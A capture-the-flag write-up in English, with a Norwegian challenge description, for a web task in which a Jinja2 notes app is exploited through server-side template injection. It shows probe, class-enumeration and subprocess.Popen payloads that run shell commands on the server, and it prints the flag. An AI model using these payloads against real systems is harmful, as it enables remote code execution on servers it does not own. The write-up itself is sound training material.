# Writeup [Templating](./README.md)

## Challenge description
Onkel Skrue hadde alltid vært flink med penger og investeringer, og han hadde nettopp bestemt seg for å begynne å bruke en notat applikasjon for å holde styr på alle sine økonomiske transaksjoner. Han visste at han trengte en pålitelig og sikker app for å sikre at hans sensitive finansielle data ikke ble kompromittert.

Så han kontaktet en utvikler for å få bygget en skreddersydd notat applikasjon. Han presset utvikleren til å tilby en lav pris og var fornøyd med at han hadde klart å spare litt penger. Men er applikasjonen virkelig så sikker som han tror?

**Points: 1000**

**Author: AresDiode**

**Difficulty: challening**

**Category: Web** (optional, several may be added if suitable)

---

## Writeup

In this task you are given a web application that uses Jinja2 templating engine. The application is vulnerable to RCE (Remote Code Execution) and the goal is to get the flag.

### Vulnerability
SSTI, or Server-Side Template Injection, is a type of web application vulnerability that occurs when user-supplied input is not properly sanitized and is used as part of a server-side template engine. This allows an attacker to inject and execute arbitrary code within the server-side template, which can lead to remote code execution and compromise of the affected system.

Server-side templates are commonly used in web applications to generate dynamic HTML pages based on user input. These templates often contain placeholders for data that is dynamically inserted by the server. If an attacker can manipulate these placeholders and inject malicious code, the server may execute that code and perform unintended actions.

SSTI vulnerabilities are a serious security concern and can be exploited to gain unauthorized access, steal sensitive data, or launch further attacks. Web application developers can prevent SSTI vulnerabilities by properly sanitizing user input, using strict input validation, and avoiding the use of user input in server-side templates whenever possible.

### Exploitation
To test if the application is vulnerable to SSTI, you can try to inject a simple payload for example:

```
{{7*7}}
```
If the application is vulnrarable it will return the result of the expression, in this case 49. This means that the application is vulnerable to SSTI, and the template engine executed our code. Now in order to properly exploit this we need to know what type of templating engine is running, this can be done with tools such as Wappalyzer. In this case the application is using Jinja2. Now we need to find a way to execute commands on the server. After some research I found that the following payload will execute a command on the server:

```
{{ ''.__class__.__mro__[2].__subclasses__()}}
```
This will list out all the possible sub classes we can use, what we are interested in is subprocess.Popen, this is number 246 in the list, to format the list you can use a text editor and replace every comma with a new line. Now we can use the following payload to execute a command:

```
{{ ''.__class__.__mro__[2].__subclasses__()[245]('strings flag/flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

And then... Whoop whoop, we got the flag!

```
TG23{L0nn3r_s3g_ikk3_å_være_gjærrig}
```
